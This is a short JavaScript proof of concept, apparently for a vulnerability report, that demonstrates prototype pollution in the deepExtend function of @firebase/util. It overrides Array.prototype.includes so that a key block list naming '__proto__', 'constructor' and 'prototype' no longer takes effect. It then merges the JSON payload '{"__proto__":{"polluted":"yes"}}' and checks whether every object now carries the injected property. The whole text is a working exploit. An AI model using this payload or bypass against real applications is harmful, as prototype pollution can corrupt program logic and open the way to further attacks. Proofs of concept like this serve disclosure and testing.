Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const utils = require('@firebase/util');
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
utils.deepExtend({}, source);
console.log({}.polluted);